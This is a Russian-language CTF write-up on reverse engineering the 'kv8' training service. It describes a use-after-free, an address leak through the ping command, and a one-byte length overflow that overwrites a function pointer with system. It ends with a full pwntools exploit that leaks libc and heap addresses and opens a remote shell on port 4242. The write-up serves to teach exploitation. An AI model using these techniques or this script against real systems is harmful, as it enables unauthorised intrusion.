# SPbCTF training by fargate

## kv8 service

## Solution

*English version TBA*

Сервис состоял из одного бинарного файла `kv8`, посмотрим что на него говорит `file`

```
$ file kv8
kv8: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=09549d5175bc8e6f1c8dc3dcaa1c45eab655206b, not stripped
```

## Reversing the binary

Сначала рассмотрим общую функциональность, которую из себя представляет `kv8`. Вот файлик с [псевдокодом](./pseudocode.c) для тех, у кого нету под рукой IDA.

### Общие слова

Бинарь 6 раз у нас читает реквесты и потом вырубается. Чтение реквеста начинается с чтения хедера `read_heder`. В этой функции мы вводим 16 байт:

```
   8 bytes       8 bytes
| cmd_option |  buf_size  |
```

Происходят проверки на то, что `0 <= cmd_options <= 5` и `0 <= buf_size <= 0x400`.

Затем вызывается один из обработчиков `handlers[cmd_option](cmd_option, buf_size)`. Соответственно, `handlers` - это некий массив обработчиков:

```
handlers
.data:203020         dq offset cmd_auth
.data:203028         dq offset cmd_head
.data:203030         dq offset cmd_put
.data:203038         dq offset cmd_get
.data:203040         dq offset ping
.data:203048         dq offset cmd_quit
```

Таким образом, у нас перед глазами находится вся функциональность рассматриваемого сервиса. Исследуем каждую функцию по отдельности, ниже будут приведены комментарии по каждой из них

### cmd_auth

Тут есть подозрительный `alloca`, но так как `0 <= buf_size <= 0x400`, то никаких хаков здесь не получится. Здесь создаётся локальный буффер на стеке с помощью `alloca`. в который затем считываются данные. Данные эти выглядят так:

```
   1 byte    uid_len bytes
| uid_len | . . . uid . . . |
```

Если `uid_len + 1 <= 0x80`, то мы аллоцируем два чанка на хипе под `struct user_t` и `uid` буффер.

```c
struct user_t {
    bool auth; /* 8 bytes */
    char * uid_ptr;
    size_t (*dealloc_func)(void *ptr); /* functino pointer */
}
```

Затем ставим `user->auth = 1`, копируем данные из локального буффера `uid` в чанк `user->uid` и ставим `dealloc_func` равным `free`.

После всех действий ставим указатель на чанк `user` в структуру `root_ctx` (её поля я писать не буду, так как выкинул листочек, на котором писал, а восстанавливать лень).

### cmd_head

Сперва проверяется, что пользователь должен быть авторизован (почему-то два раза, но это не особо влияет на ход решения). Выделяется локальный буффер под данные (тем же `alloca`), и в этот буффер вводтся строчка, которая должна удволетворять следующим условиям (прошу простить за псеводпитон):

```python
for x in string:
    if not re.match("[a-zA-Z0-9-]", x)
        return false
return true
```

Если строчка всё же удволетворяет условиям, то мы пытаемся открыть файл с именем, которое формируется так:

```python
filename = "data/{}_{}".format(root_ctx->user->uid, stdin_string)
```

Если открывается, то возвращается код ответа 200, иначе 404. То есть, эта функция просто проверяет, присутствует ли такой файл на сервере.

### cmd_put

Как видно из названия, эта функция просто кладёт файл на сервер и записывает в него указанные данные. Имя файла генерируется по примеру выше. Детально разбирать эту функцию я не буду, можете почитать [псевдокод](./pseudocode.c). Если прям очень нужно её описать комментами, то дайте мне знать.

### cmd_get

Возвращает данные по указаному имени файла. Имя файла, как и прежде, формируется из `root_ctx->user->uid` и введённой строчки

### ping

Это функция поинтереснее остальных, так как никак особо не влияет на функционал, значит чексистем юзать её для проверки флагов скорее всего не будет. Что же происходит внутри?

Мы вводим байты указанного `buf_size` размера, после этого бинарь выводит три строчки:

```c
writen(idx, idx_len); // our entered string
writen(pong, pond_len); // " pong " string
writen(root_ctx, final_size); // root_ctx string
```

К этой функции мы вернёмся позже

### cmd_quit

И последняя пользовательска функция, в котороый мы производим logout текущего пользователя. Проверяем, что `root_ctx->user != NULL` и после этого чистим чанки:

```c
free(root_ctx->user->uid);
free(root_ctx->user);
```

## Exploitation

Что ж, где-то тут должны быть уязвимости, давайте их искать. 

### cmd_quit (again)

Начнём с `cmd_quit`, так как она больше всех бросается в глаза. В ней мы чистим чанки `root_ctx->user->uid` и `root_ctx->user`, но не обнуляем соответствующие поля. В нормальном варианте эта функция должна выглядеть как-то так:

```c
void cmd_quit(size_t cmd, size_t buf_size)
{
    struct user_t *user;
    size_t (__fastcall *dealloc)(size_t);
    size_t goodbye_len;

    if ( buf_size )
        __assert_fail("header.l == 0", "/vagrant/spbctf/fargate-training/kv8/main.c", 0x93u, "cmd_quit");
    goodbye_len = strlen("goodby");
    write_header(200, goodbye_len);
    writen("goodby", goodbye_len);
    user = root_ctx->user;
    if ( user ) {
        dealloc = user->dealloc_func;
        
        dealloc(user->uid);
        user->uid = NULL;
        user->auth = 0;
        
        dealloc(root_ctx->user);
        root_ctx->user = NULL;
    }
}
```

Но с тем вариантом, который есть у нас, мы можем использовать уже почищенные чанки в других пользовательских функциях. А так же почистить те же самые чанки ещё раз. Таким образом, эта функция даёт Use-After-Free и Double Free баги.

Небольшой спойлер: во время CTFа я не смог их раскрутить, да и вообще считаю, что в данном сервисе их невозможно раскрутить до чего-то вменяемого. Почему я так считаю можете спросить у меня в телеге.

### ping / leaking addresses

Раз предыдущая функция ничего существенного не дала, то давайте посмотрим на ту самую пользовательскую функцию, которую чексистем никак юзать не стала бы (хотя зависит от чекера, конечно).

Ниже я приложу кусок псевдокода, по которому будем ориентироваться:

```c
unsigned __int64 __fastcall ping(__int64 cmd, unsigned __int64 buf_size)
{
  void *v2; // rsp
  unsigned __int64 __buf_size; // rbx
  size_t pos; // rbx
  size_t root_len; // rax
  unsigned __int64 idx_len; // rax
  unsigned __int64 pond_len; // rax
  size_t idx_len_; // rax
  __int64 l2; // rbx
  size_t pong_len; // rax
  __int64 _cmd; // [rsp+0h] [rbp-60h]
  unsigned __int64 _buf_size; // [rsp+8h] [rbp-58h]
  unsigned __int64 v14; // [rsp+10h] [rbp-50h]
  char *idx; // [rsp+18h] [rbp-48h]
  char *pong; // [rsp+20h] [rbp-40h]
  size_t str_len; // [rsp+28h] [rbp-38h]
  __int64 v18; // [rsp+30h] [rbp-30h]
  size_t v19; // [rsp+38h] [rbp-28h]
  unsigned __int64 canary; // [rsp+48h] [rbp-18h]

  _cmd = cmd;
  _buf_size = buf_size;
  canary = __readfsqword(0x28u);
  if ( !buf_size || _buf_size > 0x400 )
    __assert_fail(
      "header.l > 0 && header.l <= TLV_MAX_LEN",
      "/vagrant/spbctf/fargate-training/kv8/main.c",
      0xA4u,
      "ping");
  v14 = _buf_size - 1;
  v2 = alloca(16 * ((_buf_size + 15) / 0x10));
  idx = &_cmd;
  readn(&_cmd, _buf_size);
  idx[_buf_size - 1] = 0;
  pong = " pong ";
  __buf_size = _buf_size;
  pos = strlen(" pong ") + __buf_size;
  root_len = strlen(root_ctx);
  str_len = pos + root_len;
  v18 = 200LL;
  v19 = pos + root_len;
  write_header(200LL, pos + root_len);
  idx_len = strlen(idx);
  writen(idx, idx_len);
  pond_len = strlen(pong);
  writen(pong, pond_len);
  idx_len_ = strlen(idx);
  l2 = str_len - idx_len_;
  pong_len = strlen(pong);
  writen(root_ctx, l2 - pong_len);
  return __readfsqword(0x28u) ^ canary;
}
```

Итак, давайте смотреть как формируется `final_size` aka `l2 - pong_len` (простите за такой псевдокод без типов):

```c
__buf_size = _buf_size;
pos = strlen(" pong ") + __buf_size;
root_len = strlen(root_ctx);
str_len = pos + root_len;
idx_len_ = strlen(idx);
l2 = str_len - idx_len_;
final_size = l2 - pong_len;
```

Что, если мы укажем `buf_size = 0x84`, а `idx` будет выглядеть так:

```c
idx = "AAAA" + "\x00" * 0x80
```

Тогда давайте посчитаем `final_len`:

```c
__buf_size = _buf_size; // 0x84
pos = strlen(" pong ") + __buf_size; // 0x8a
root_len = strlen(root_ctx); // 0x10
str_len = pos + root_len; // 0x9a
idx_len_ = strlen(idx); // 0x4
l2 = str_len - idx_len_; // 0x96
final_size = l2 - pong_len; // 0x90
```

А что это мы такое получили? Мы получили значение больше `0x10`! Это значит, что мы выводим не только строчку `kv8 version 4242`, но и ещё `0x80` байтов! Таким образом, мы получаем адреса хипа и libc (так как структура `root_ctx` хранит в себе указатели на хипа и на функцию вывода, которая часть libc).


### cmd_auth / heap overflow

Круто, такми образом мы слили очень полезные адреса. Но как же нам что-то покарраптить?

Взглянем ещё раз на функцию `cmd_auth`, а именно на проверку

```c
if ( (msg_len + 1) <= 0x80u ) {
    // create user
    // . . .
}
```

`msg_len` длиной в 1 байт и мы его контролируем. Если указать `msg_len = 0xff`, то при инкрементировании тип переполнится и `msg_len` станет равным 0 и проверка пройдёт успешно. Значит, после создания чанка `uid` и `user`, мы сможем перезаписать чанк пользователя, а вместе с ним и `user->dealloc_func` с `user->uid`.

Вспомним теперь, что в `cmd_quit` вызывается `user->dealloc(user->uid)`. То есть, если в `user->dealloc` положить `system`, а в `user->uid` указатель на контролируемую нами строчку (например, `"/bin/sh"`), то мы отспавним шелл.

## Exploit

Это не конечный вариант, который мы использовали на самом контесте, но зато можете потестить его локально (сорян за говнокод бтв)

```python
#!/usr/bin/python2

import sys

from pwn import *


def cmd_auth(pc, msg_len, uid):
    pc.send(msg_len)
    pc.send(uid)


def cmd_head(pc, idx):
    pc.send(idx)


def cmd_put(pc, idx_len, data_len, idx, data):
    pc.send(idx_len)
    pc.send(data_len)
    pc.send(idx)
    pc.send(data)


def cmd_get(pc, idx):
    pc.send(idx)


def cmd_ping(pc, data):
    pc.send(data)


def cmd_quit(pc):
    pass


CMD = {
    cmd_auth:   0,
    cmd_head:   1,
    cmd_put:    2,
    cmd_get:    3,
    cmd_ping:   4,
    cmd_quit:   5
}


def cmd_func(pc, cmd, buf_size, *args):
    pc.send(p64(CMD[cmd]))
    pc.send(p64(buf_size))
    cmd(pc, *args)


def main(pc):
    binsh = 0x181519
    system = 0x44c50

    cmd_func(pc, cmd_ping, 0x44, 'ping' + '\x00' * 0x40)
    resp = ''
    while len(resp) != 0x60:
        resp += pc.recv(0x60)

    libc_base = u64(resp[74:82]) - 0x39fb0
    heap_base = u64(resp[82:90]) - 0x10
    
    log.success('heap base @ ' + hex(heap_base))
    log.success('libc base @ ' + hex(libc_base))

    cmd = '/bin/sh\x00'

    cmd_func(pc, cmd_auth, 0xa9, p8(0xff), cmd + '\x01' * (0x88 - len(cmd)) + \
            p64(0x120) + p64(1) + p64(heap_base + 0x60) + \
            p64(libc_base + system))

    cmd_func(pc, cmd_quit, 0)

    pc.interactive()


if __name__ == '__main__':
    while True:
        pc = remote(sys.argv[1], 4242)
        try:
            main(pc)
            break
        except Exception:
            pass
        finally:
            pc.close()
```

Спасибо `@korniltsev` за крутой сервис! 

![meme](https://www.meme-arsenal.com/memes/6e251523d3ceb09308c3a3a82fb9dcc4.jpg)



